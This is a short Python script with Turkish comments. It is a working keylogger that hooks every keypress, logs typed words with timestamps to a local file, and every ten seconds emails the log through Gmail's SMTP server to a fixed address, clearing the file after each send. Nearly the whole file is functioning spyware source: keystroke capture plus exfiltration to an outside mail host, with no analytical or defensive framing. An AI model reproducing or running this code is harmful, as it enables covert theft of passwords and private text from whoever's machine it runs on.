import keyboard
import datetime
import smtplib
from email.mime.text import MIMEText
import time 

word = ""
interval = 10

def on_press(key):
    global word
    try:
        if key.name in ["space", "enter"]:
            if word:  # Boş string kontrolü
                with open("key_log.txt", "a", encoding="utf-8") as file:
                    file.write(word + " | Girilme Tarihi: " + str(datetime.datetime.now()) + "\n")
                word = ""
        elif key.name == "backspace":
            word = word[:-1] 
        elif len(key.name) == 1:  # Sadece tek karakterli tuşları ekle
            word += key.name
        else:
            # Özel tuşlar için (shift, ctrl, vb.)
            word += f"[{key.name}]"
    except AttributeError:
        # Bazı özel tuşlarda hata olabilir
        pass

keyboard.on_press(on_press)

print("KeyLogger başlatıldı. Durdurmak için Ctrl+C yapın.")

def send_email():
    """Mail gönderme fonksiyonu"""
    try:
        with open("key_log.txt", "r", encoding="utf-8") as file:
            data = file.read()
    except FileNotFoundError:
        print("key_log.txt dosyası bulunamadı.")
        return False

    if not data.strip():  # Dosya boş mu kontrol et
        print("Dosya boş, mail gönderilmedi.")
        return False

    try:
        print("Mail gönderiliyor...")
        
        msg = MIMEText(data, _charset="utf-8")
        msg["Subject"] = "KeyLogger Data"
        msg["From"] = "erencoding94@gmail.com"
        msg["To"] = "16008121072@ogr.bozok.edu.tr"

        # SMTP bağlantısı
        mail = smtplib.SMTP('smtp.gmail.com', 587, timeout=30)
        mail.starttls()
        mail.login('erencoding94@gmail.com', 'UYGULAMA_ŞİFRENİ_BURAYA_YAZ')
        mail.sendmail("erencoding94@gmail.com", '16008121072@ogr.bozok.edu.tr', msg.as_string())
        mail.quit()
        
        print(f"Mail başarıyla gönderildi: {datetime.datetime.now()}")
        
        # Mail gönderildikten sonra dosyayı temizle
        with open("key_log.txt", "w", encoding="utf-8") as file:
            file.write("")
        
        return True
        
    except Exception as e:
        print(f"Mail gönderme hatası: {e}")
        return False

try:
    while True:
        time.sleep(interval)
        send_email()
                
except KeyboardInterrupt:
    print("\n\nKeyLogger durduruldu.")
    # Kapanmadan önce son bir kez mail göndermeyi dene
    print("Son loglar gönderiliyor...")
    send_email()
